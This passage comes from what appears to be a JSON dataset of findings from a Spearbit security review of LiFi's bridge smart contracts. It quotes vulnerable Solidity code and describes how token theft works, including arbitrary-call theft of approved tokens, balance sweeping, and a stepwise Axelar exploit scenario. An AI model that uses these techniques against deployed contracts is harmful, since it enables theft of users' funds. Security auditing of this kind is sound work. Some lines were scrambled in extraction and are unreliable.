ReentrancyGuard, ILiFi { function _executeWithToken(...) ... { ... (bool success, ) = callTo.call(callData); if (!success) revert ExecutionFailed(); } }", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Use the getStorage() / NAMESPACE pattern instead of global variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The facet DexManagerFacet and the inherited contracts Swapper.sol / SwapperV2.sol define a global variable appStorage on the first storage slot. These two overlap, which in this case is intentional. However it is dangerous to use this construction in a Diamond contract as this uses delegatecall. If any other contract uses a global variable it will overlap with appStorage with unpredictable results. This is especially impor- tant because it involves access control. For example if the contract IAxelarExecutable.sol were to be inherited in a facet, then its global variable gateway would overlap. Luckily this is currently not the case. contract DexManagerFacet { ... LibStorage internal appStorage; ... } contract Swapper is ILiFi { ... LibStorage internal appStorage; // overlaps with DexManagerFacet which is intentional ... }", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Decrease allowance when it is already set a non-zero value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Non-standard tokens like USDT will revert the transaction when a contract or a user tries to approve an allowance when the spender allowance is already set to a non zero value. For that reason, the previous allowance should be decreased before increasing allowance in the related function.  Performing a direct overwrite of the value in the allowances mapping is susceptible to front-running scenarios by an attacker (e.g., an approved spender). As an Openzeppelin mentioned, safeApprove should only be called when setting an initial allowance or when resetting it to zero. 9 function safeApprove( IERC20 token, address spender, uint256 value ) internal { // safeApprove should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' require( (value == 0) || (token.allowance(address(this), spender) == 0), \"SafeERC20: approve from non-zero to non-zero allowance\" ); _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); } There are four instance of this issue:  AxelarFacet.sol is directly using approve function which does not check return value of an external function. The faucet should utilize LibAsset.maxApproveERC20() function like the other faucets.  LibAsset s LibAsset.maxApproveERC20() function is used on the other faucets. For instance, USDTs ap- proval mechanism reverts if current allowance is nonzero. From that reason, the function can approve with zero first or safeIncreaseAllowance can be utilized.  FusePoolZap.sol is also using approve function which does not check return value . The contract does not import any other libraries, that being the case, the contract should use safeApprove function with approving zero.  Executor.sol is directly using approve function which does not check return value of an external function. The contract should utilize LibAsset.maxApproveERC20() function like the other contracts.", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Too generic calls in GenericBridgeFacet allow stealing of tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "With the contract GenericBridgeFacet, the functions swapAndStartBridgeTokensGeneric() (via LibSwap.swap()) and _startBridge() allow arbitrary functions calls, which allow anyone to call transferFrom() and steal tokens from anyone who has given a large allowance to the LiFi protocol. This has been used to hack LiFi in the past. The followings risks also are present:  call the Lifi Diamand itself via functions that dont have nonReentrant.  perhaps cancel transfers of other users.  call functions that are protected by a check on this, like completeBridgeTokensViaStargate. 10 contract GenericBridgeFacet is ILiFi, ReentrancyGuard { function swapAndStartBridgeTokensGeneric( ... LibSwap.swap(_lifiData.transactionId, _swapData[i]); ... } function _startBridge(BridgeData memory _bridgeData) internal { ... (bool success, bytes memory res) = _bridgeData.callTo.call{ value: value ,! }(_bridgeData.callData); ... } } library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); ... } }", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "LiFi protocol isnt hardened", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The usage of the LiFi protocol depends largely on off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs and doesnt verify them. Several elements are not connected via smart contracts but via the API, for example:  the emits of LiFiTransferStarted versus the bridge transactions.  the fees paid to the FeeCollector versus the bridge transactions.  the Periphery contracts as defined in the PeripheryRegistryFacet versus the rest. In case the API and or frontend contain errors or are hacked then tokens could be easily lost. Also, when calling the LiFi contracts directly or via other smart contracts, it is rather trivial to commit mistakes and loose tokens. Emit data can be easily disturbed by malicious actors, making it unusable. The payment of fees can be easily circumvented by accessing the contracts directly. It is easy to make fake websites which trick users into signing transactions which seem to be for LiFi but result in loosing tokens. With the current design, the power of smart contracts isnt used and it introduces numerous risks as described in the rest of this report.", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Bridge with Axelar can be stolen with malicious external call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Executor contract allows users to build an arbitrary payload external call to any address except address(erc20Proxy). erc20Proxy is not the only dangerous address to call. By building a malicious external call to Axelar gateway, exploiters can steal users funds. The Executor does swaps at the destination chain. By setting the receiver address to the Executor contract at the destination chain, Li-Fi can help users to get the best price. Executor inherits IAxelarExecutable. execute and executeWithToken validates the payload and executes the external call. IAxelarExecutable.sol#L27-L40 function executeWithToken( bytes32 commandId, string calldata sourceChain, string calldata sourceAddress, bytes calldata payload, string calldata tokenSymbol, uint256 amount ) external { bytes32 payloadHash = keccak256(payload); if (!gateway.validateContractCallAndMint(commandId, sourceChain, sourceAddress, payloadHash, ,! tokenSymbol, amount)) revert NotApprovedByGateway(); _executeWithToken(sourceChain, sourceAddress, payload, tokenSymbol, amount); } The nuance lies in the Axelar gateway AxelarGateway.sol#L133-L148. Once the receiver calls validateContract- CallAndMint with a valid payload, the gateway mints the tokens to the receiver and marks it as executed. It is the receiver contracts responsibility to execute the external call. Exploiters can build a malicious external call to trigger validateContractCallAndMint, the Axelar gateway would mint the tokens to the Executor contract. The exploiter can then pull the tokens from the Executor contract. The possible exploit scenario 1. Exploiter build a malicious external call. token.approve(address(exploiter), type(uint256).max) 2. A victim user uses the AxelarFacet to bridge tokens. Since the destination bridge has the best price, the users set the receiver to address(Executor) and finish the swap with this.swapAndCompleteBridgeTokens 3. Exploiter observes the victims bridge tx and way.validateContractCallAndMint. exploiter can pull the minted token from the executor contract since theres max allowance. The executor the minted token. builds an contract gets external call to trigger gate- The 4. The victim calls Executor.execute() with the valid payload. However, since the payload has been triggered by the exploiter, its no longer valid. 12", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "LibSwap may pull tokens that are different from the specified asset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "LibSwap.swap is responsible for doing swaps. Its designed to swap one asset at a time. The _- swapData.callData is provided by user and the LiFi protocol only checks its signature. As a result, users can build a calldata to swap a different asset as specified. For example, the users can set fromAssetId = dai provided addLiquidity(usdc, dai, ...) as call data. The uniswap router would pull usdc and dai at the same time. If there were remaining tokens left in the LiFi protocol, users can sweep tokens from the protocol. library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... if (!LibAsset.isNativeAsset(fromAssetId)) { LibAsset.maxApproveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount); if (toDeposit != 0) { LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); } } else { nativeValue = fromAmount; } // solhint-disable-next-line avoid-low-level-calls (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); if (!success) { string memory reason = LibUtil.getRevertMsg(res); revert(reason); } }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Check slippage of swaps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several bridges check that the output of swaps isnt 0. However it could also happen that swap give a positive output, but still lower than expected due to slippage / sandwiching / MEV. Several AMMs will have a mechanism to limit slippage, but it might be useful to add a generic mechanism as multiple swaps in sequence might have a relative large slippage. function swapAndStartBridgeTokensViaOmniBridge(...) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); if (amount == 0) { revert InvalidAmount(); } _startBridge(_lifiData, _bridgeData, amount, true); }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Replace createRetryableTicketNoRefundAliasRewrite() with depositEth()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function _startBridge() of the ArbitrumBridgeFacet uses createRetryableTicketNoRefun- dAliasRewrite(). According to the docs: address-aliasing, this method skips some address rewrite magic that depositEth() does. Normally depositEth() should be used, according to the docs depositing-and-withdrawing-ether. Also this method will be deprecated after nitro: Inbox.sol#L283-L297. While the bridge doesnt do these checks of depositEth(), it is easy for developers, that call the LiFi contracts directly, to make mistakes and loose tokens. function _startBridge(...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { gatewayRouter.createRetryableTicketNoRefundAliasRewrite{ value: _amount + cost }(...); } ... ... }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Hardcode or whitelist the Axelar destinationAddress", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The functions executeCallViaAxelar() and executeCallWithTokenViaAxelar() call a destina- tionAddress on the destinationChain. This destinationAddress needs to have specific Axelar functions (_ex- ecute() and _executeWithTokento() ) be able to receive the calls. This is implemented in the Executor. If these functions dont exist at the destinationAddress, the transferred tokens will be lost. /// @param destinationAddress the address of the LiFi contract on the destinationChain function executeCallViaAxelar(..., string memory destinationAddress, ...) ... { ... s.gateway.callContract(destinationChain, destinationAddress, payload); } Note: the comment \"the address of the LiFi contract\" isnt clear, it could either be the LiFi Diamond or the Execu- tor.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "WormholeFacet doesnt send native token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The functions of WormholeFacet allow sending the native token, however they dont actually send it across the bridge, causing the native token to stay stuck in the LiFi Diamond and get lost for the sender. contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { function startBridgeTokensViaWormhole(... ) ... payable ... { // is payable LibAsset.depositAsset(_wormholeData.token, _wormholeData.amount); // allows native token _startBridge(_wormholeData); ... } function _startBridge(WormholeData memory _wormholeData) private { ... LibAsset.maxApproveERC20(...); // geared towards ERC20, also works when `msg.value` is set // no { value : .... } IWormholeRouter(_wormholeData.wormholeRouter).transferTokens(...); } }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "ArbitrumBridgeFacet does not check if msg.value is enough to cover the cost", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The ArbitrumBridgeFacet does not check whether the users provided ether (msg.value) is enough to cover _amount + cost. If there are remaining ethers in LiFis LibDiamond address, exploiters can set a large cost and sweep the ether. function _startBridge( ... ) private { ... uint256 cost = _bridgeData.maxSubmissionCost + _bridgeData.maxGas * _bridgeData.maxGasPrice; if (LibAsset.isNativeAsset(_bridgeData.assetId)) { gatewayRouter.createRetryableTicketNoRefundAliasRewrite{ value: _amount + cost }( ... ); } else { gatewayRouter.outboundTransfer{ value: cost }( ... ); }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Underpaying Optimism l2gas may lead to loss of funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The OptimismBridgeFacet uses Optimisms bridge with user-provided l2gas. function _startBridge( LiFiData calldata _lifiData, BridgeData calldata _bridgeData, uint256 _amount, bool _hasSourceSwap ) private { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { bridge.depositETHTo{ value: _amount }(_bridgeData.receiver, _bridgeData.l2Gas, \"\"); } else { ... bridge.depositERC20To( _bridgeData.assetId, _bridgeData.assetIdOnL2, _bridgeData.receiver, _amount, _bridgeData.l2Gas, \"\" ); } } Optimisms standard token bridge makes the cross-chain deposit by sending a cross-chain message to L2Bridge. L1StandardBridge.sol#L114-L123 17 // Construct calldata for finalizeDeposit call bytes memory message = abi.encodeWithSelector( IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.OVM_ETH, _from, _to, msg.value, _data ); // Send calldata into L2 // slither-disable-next-line reentrancy-events sendCrossDomainMessage(l2TokenBridge, _l2Gas, message); If the l2Gas is underpaid, finalizeDeposit will fail and user funds will be lost.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Funds can be locked during the recovery stage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The recovery is an address that should receive funds if the execution fails on destination do- main. This ensures that funds are never lost with failed calls. However, in the AmarokFacet It is hardcoded as msg.sender. Several unexpected behaviour can be observed with this implementation.  If the msg.sender is a smart contract, It might not be available on the destination chain.  If the msg.sender is a smart contract and deployed on the other chain, the contract maybe will not have function to withdraw native token. As a result of this implementation, funds can be locked when an execution fails. 18 contract AmarokFacet is ILiFi, SwapperV2, ReentrancyGuard { ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, relayerFee: 0, slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ... }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "What if the receiver of Axelar _executeWithToken() doesnt claim all tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function _executeWithToken() approves tokens and then calls callTo. If that contract doesnt retrieve the tokens then the tokens stay within the Executor and are lost. Also see: \"Remaining tokens can be sweeped from the LiFi Diamond or the Executor\" contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeWithToken(...) ... { ... // transfer received tokens to the recipient IERC20(tokenAddress).approve(callTo, amount); (bool success, ) = callTo.call(callData); ... } }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Remaining tokens can be sweeped from the LiFi Diamond or the Executor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The initial balance of (native) tokens in both the Lifi Diamond and the Executor contract can be sweeped by all the swap functions in all the bridges, which use the following functions:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  _executeAndCheckSwaps() of SwapperV2.sol  _executeAndCheckSwaps() of Swapper.sol  swapAndCompleteBridgeTokens() of XChainExecFacet Although these functions ...  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  swapAndCompleteBridgeTokens() of XChainExecFacet have the following code: if (!LibAsset.isNativeAsset(transferredAssetId)) { startingBalance = LibAsset.getOwnBalance(transferredAssetId); // sometimes transfer tokens in } else { startingBalance = LibAsset.getOwnBalance(transferredAssetId) - msg.value; } // do swaps uint256 postSwapBalance = LibAsset.getOwnBalance(transferredAssetId); if (postSwapBalance > startingBalance) { LibAsset.transferAsset(transferredAssetId, receiver, postSwapBalance - startingBalance); } This doesnt protect the initial balance of the first tokens, because it can just be part of a swap to another token. The initial balances of intermediate tokens are not checked or protected. As there normally shouldnt be (native) tokens in the LiFi Diamond or the Executor the risk is limited. Note: set the risk to medium as there are other issues in this report that leave tokens in the contracts Although in practice there is some dust in the LiFi Diamond and the Executor:  0x362fa9d0bca5d19f743db50738345ce2b40ec99f  0x46405a9f361c1b9fc09f2c83714f806ff249dae7", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Wormhole bridge chain IDs are different than EVM chain IDs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "According to documentation, Wormhole uses different chain ids than EVM based chain ids. However, the code is implemented with block.chainid check. LiFi is integrated with third party platforms through API. The API/UI side can implement chain id checks, but direct interaction with the contract can lead to loss of funds. function _startBridge(WormholeData memory _wormholeData) private { if (block.chainid == _wormholeData.toChainId) revert CannotBridgeToSameNetwork(); } From other perspective, the following line limits the recipient address to an EVM address. done to a non EVM chain (e.g. Solana, Terra, Terra classic), then the tokens would be lost. If a bridge would be ... bytes32(uint256(uint160(_wormholeData.recipient))) ... Example transactions below.  Chainid 1 Solana  Chainid 3 Terra Classic On the other hand, the usage of the LiFi protocol depends largely on off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs. As previously mentioned, the wormhole destination chain ids are different than standard EVM based chains, the following event can be misinterpreted. ... emit LiFiTransferStarted( _lifiData.transactionId, \"wormhole\", \"\", _lifiData.integrator, _lifiData.referrer, _swapData[0].sendingAssetId, _lifiData.receivingAssetId, _wormholeData.recipient, _swapData[0].fromAmount, _wormholeData.toChainId, // It does not show correct chain id which is expected by LiFi Data Analytics true, false ,! ); ...", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Facets approve arbitrary addresses for ERC20 tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "All the facets pointed above approve an address for an ERC20 token, where both these values are provided by the user: LibAsset.maxApproveERC20(IERC20(token), router, amount); The parameter names change depending on the context. So for any ERC20 token that LifiDiamond contract holds, user can:  call any of the functions in these facets to approve another address for that token.  use the approved address to transfer tokens out of LifiDiamond contract. Note: normally there shouldnt be any tokens in the LiFi Diamond contract so the risk is limited. Note: also see \"Hardcode bridge addresses via immutable\"", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk AcrossFacet.sol#L103, ArbitrumBridge-"]}, {"title": "FeeCollector not well integrated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There is a contract to pay fees for using the bridge: FeeCollector. This is used by crafting a transaction by the frontend API, which then calls the contract via _executeAndCheckSwaps(). Here is an example of the contract Here is an example of the contract of such a transaction Its whitelisted here This way no fees are paid if a developer is using the LiFi contracts directly. Also it is using a mechanism that isnt suited for this. The _executeAndCheckSwaps() is geared for swaps and has several checks on balances. These (and future) checks could interfere with the fee payments. Also this is a complicated and non transparent approach. The project has suggested to see _executeAndCheckSwaps() as a multicall mechanism.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "_executeSwaps of Executor.sol doesnt have a whitelist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function _executeSwaps() of Executor.sol doesnt have a whitelist, whereas _executeSwaps() of SwapperV2.sol does have a whitelist. Calling arbitrary addresses is dangerous. For example, unlimited al- lowances can be set to allow stealing of leftover tokens in the Executor contract. Luckily, there wouldnt normally be allowances set from users to the Executor.sol so the risk is limited. Note: also see \"Too generic calls in GenericBridgeFacet allow stealing of tokens\" contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeSwaps(... ) ... { for (uint256 i = 0; i < _swapData.length; i++) { if (_swapData[i].callTo == address(erc20Proxy)) revert UnAuthorized(); // Prevent calling ,! ERC20 Proxy directly LibSwap.SwapData calldata currentSwapData = _swapData[i]; LibSwap.swap(_lifiData.transactionId, currentSwapData); } } contract SwapperV2 is ILiFi { function _executeSwaps(... ) ... { for (uint256 i = 0; i < _swapData.length; i++) { LibSwap.SwapData calldata currentSwapData = _swapData[i]; if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } } Based on the comments of the LiFi project there is also the use case to call more generic contracts, which do not return any token, e.g., NFT buy, carbon offset. It probably better to create new functionality to do this.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Processing of end balances", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The contract SwapperV2 has the following construction (twice) to prevent using any already start balance.  it gets a start balance.  does an action.  if the end balance > start balance. then it uses the difference. else (which includes start balance == end balance) it uses the end balance. So if the else clause it reached it uses the end balance and ignores any start balance. If the action hasnt changed the balances then start balance == end balance and this amount is used. When the action has lowered the balances then end balance is also used. This defeats the codes purpose. Note: normally there shouldnt be any tokens in the LiFi Diamond contract so the risk is limited. Note Swapper.sol has similar code. contract SwapperV2 is ILiFi { modifier noLeftovers(LibSwap.SwapData[] calldata _swapData, address payable _receiver) { ... uint256[] memory initialBalances = _fetchBalances(_swapData); ... // all kinds of actions newBalance = LibAsset.getOwnBalance(curAsset); curBalance = newBalance > initialBalances[i] ? newBalance - initialBalances[i] : newBalance; ... } function _executeAndCheckSwaps(...) ... { ... uint256 swapBalance = LibAsset.getOwnBalance(finalTokenId); ... // all kinds of actions uint256 newBalance = LibAsset.getOwnBalance(finalTokenId); swapBalance = newBalance > swapBalance ? newBalance - swapBalance : newBalance; ... }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Processing of initial balances", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The LiFi code bases contains two similar source files: Swapper.sol and SwapperV2.sol. One of the differences is the processing of msg.value for native tokens, see pieces of code below. The implementation of SwapperV2.sol sends previously available native token to the msg.sender. The following is exploit example. Assume that:  the LiFi Diamond contract contains 0.1 ETH.  a call is done with msg.value == 1 ETH.  and _swapData[0].fromAmount ETH, which is the amount to be swapped. Option 1Swapper.sol: initialBalances == 1.1 ETH - 1 ETH == 0.1 ETH. Option 2 SwapperV2.sol: initialBalances == 1.1 ETH. After the swap getOwnBalance()is1.1 - 0.5 == 0.6 ETH. Option 1 Swapper.sol: returns 0.6 - 0.1 = 0.5 ETH. Option 2 SwapperV2.sol: returns 0.6 ETH (so includes the previously present ETH). 0.5 == Note: the implementations of noLeftovers() are also different in Swapper.sol and SwapperV2.sol. Note: this is also related to the issue \"Pulling tokens by LibSwap.swap() is counterintuitive\", because the ERC20 are pulled in via LibSwap.swap(), whereas the msg.value is directly added to the balance. As there normally shouldnt be any token in the LiFi Diamond contract the risk is limited. contract Swapper is ILiFi { function _fetchBalances(...) ... { ... for (uint256 i = 0; i < length; i++) { address asset = _swapData[i].receivingAssetId; uint256 balance = LibAsset.getOwnBalance(asset); if (LibAsset.isNativeAsset(asset)) { balances[i] = balance - msg.value; } else { balances[i] = balance; } } return balances; } } contract SwapperV2 is ILiFi { function _fetchBalances(...) ... { ... for (uint256 i = 0; i < length; i++) { balances[i] = LibAsset.getOwnBalance(_swapData[i].receivingAssetId); } ... } } The following functions do a comparable processing of msg.value for the initial balance:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  swapAndCompleteBridgeTokens() of XChainExecFacet 25 if (!LibAsset.isNativeAsset(transferredAssetId)) { ... } else { startingBalance = LibAsset.getOwnBalance(transferredAssetId) - msg.value; } However in Executor.sol function swapAndCompleteBridgeTokensViaStargate() isnt optimal for ERC20 tokens because ERC20 tokens are already deposited in the contract before calling this function. function swapAndCompleteBridgeTokensViaStargate(... ) ... { ... if (!LibAsset.isNativeAsset(transferredAssetId)) { startingBalance = LibAsset.getOwnBalance(transferredAssetId); // doesn't correct for initial balance } else { ... } ,! } So assume:  0.1 ETH was in the contract.  1 ETH was added by the bridge.  0.5 ETH is swapped. Then the StartingBalance is calculated to be 0.1 ETH + 1 ETH == 1.1 ETH. So no funds are returned to the receiver as the end balance is 1.1 ETH - 0.5 ETH == 0.6 ETH, is smaller than 1.1 ETH. Whereas this should have been (1.1 ETH - 0.5 ETH) - 0.1 ETH == 0.5 ETH.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Improve dexAllowlist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The functions _executeSwaps() of both SwapperV2.sol and Swapper.sol use a whitelist to make sure the right functions in the allowed dexes are called. The checks for approveTo, callTo and signature (callData) are independent. This means that any signature is valid for any dex combined with any approveTo address. This grands more access than necessary. This is important because multiple functions can have the same signature. For example these two functions have the same signature:  gasprice_bit_ether(int128) 26  transferFrom(address,address,uint256) See bytes4_signature=0x23b872dd Note: brute forcing an innocent looking function is straightforward The transferFrom() is especially dangerous because it allows sweeping tokens from other users that have set an allowance for the LiFi Diamond. If someone gets a dex whitelisted, which contains a function with the same signature then this can be abused in the current code. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); ... } }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Pulling tokens by LibSwap.swap() is counterintuitive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function LibSwap.swap() pulls in tokens via transferFromERC20() from msg.sender when needed. When put in a loop, via _executeSwaps(), it can pull in multiple different tokens. It also doesnt detect accidentally sending of native tokens with ERC20 tokens. This approach is counterintuitive and leads to risks. Suppose someone wants to swap 100 USDC to 100 DAI and then 100 DAI to 100 USDT. If the first swap somehow gives back less tokens, for example 90 DAI, then LibSwap.swap() pulls in 10 extra DAI from msg.sender. Note: this requires the msg.sender having given multiple allowances to the LiFi Diamond. Another risk is that an attacker tricks a user to sign a transaction for the LiFi protocol. Within one transaction it can sweep multiple tokens from the user, cleaning out his entire wallet. Note: this requires the msg.sender having given multiple allowances to the LiFi Diamond. In Executor.sol the tokens are already deposited, so the \"pull\" functionality is not needed and can even result in additional issues. In Executor.sol it tries to \"pull\" tokens from \"msg.sender\" itself. In the best case of ERC20 implementations (like OpenZeppeling, Solmate) this has no effect. However some non standard ERC20 imple- mentations might break. 27 contract SwapperV2 is ILiFi { function _executeSwaps(...) ... { ... for (uint256 i = 0; i < _swapData.length; i++) { ... LibSwap.swap(_lifiData.transactionId, currentSwapData); } } } library LibSwap { function swap(...) ... { ... uint256 initialSendingAssetBalance = LibAsset.getOwnBalance(fromAssetId); ... uint256 toDeposit = initialSendingAssetBalance < fromAmount ? fromAmount - ,! initialSendingAssetBalance : 0; ... if (toDeposit != 0) { LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); } } } Use LibAsset.depositAsset() before doing", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Too many bytes are checked to verify the function selector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function _executeSwaps() slices the callData with 8 bytes. The function selector is only 4 bytes. Also see docs So additional bytes are checked unnecessarily, which is probably unwanted. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) // should be 4 ) revert ContractCallNotAllowed(); ... } } Definition of dexFuncSignatureAllowList in LibStorage.sol: struct LibStorage { ... mapping(bytes32 => bool) dexFuncSignatureAllowList; ... // could be bytes4 }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Check address(self) isnt accidentally whitelisted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are several access control mechanisms. If they somehow would allow address(self) then risks would increase as there are several ways to call arbitrary functions. library LibAccess { function addAccess(bytes4 selector, address executor) internal { ... accStor.execAccess[selector][executor] = true; } } contract AccessManagerFacet { function setCanExecute(...) ... { ) external { ... _canExecute ? LibAccess.addAccess(_selector, _executor) : LibAccess.removeAccess(_selector, ,! _executor); } } contract DexManagerFacet { function addDex(address _dex) external { ... dexAllowlist[_dex] = true; ... } function batchAddDex(address[] calldata _dexs) external { dexAllowlist[_dexs[i]] = true; ... ... } }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Verify anyswap token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The AnyswapFacet supplies _anyswapData.token to different functions of _anyswapData.router. These functions interact with the contract behind _anyswapData.token. If the _anyswapData.token would be malicious then tokens can be stolen. Note, this is relevant if the LiFi contract are called directly without using the API. 30 function _startBridge(...) ... { ... IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }( _anyswapData.token,...); ... IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying( _anyswapData.token, ... ); ... IAnyswapRouter(_anyswapData.router).anySwapOut( _anyswapData.token, ...); ... ,! }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "More thorough checks for DAI in swapAndStartBridgeTokensViaXDaiBridge()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function swapAndStartBridgeTokensViaXDaiBridge() checks lifiData.sendingAssetId == DAI, however it doesnt check that the result of the swap is DAI (e.g. _swapData[_swapData.length - 1].re- ceivingAssetId == DAI ). function swapAndStartBridgeTokensViaXDaiBridge(...) ... { ... if 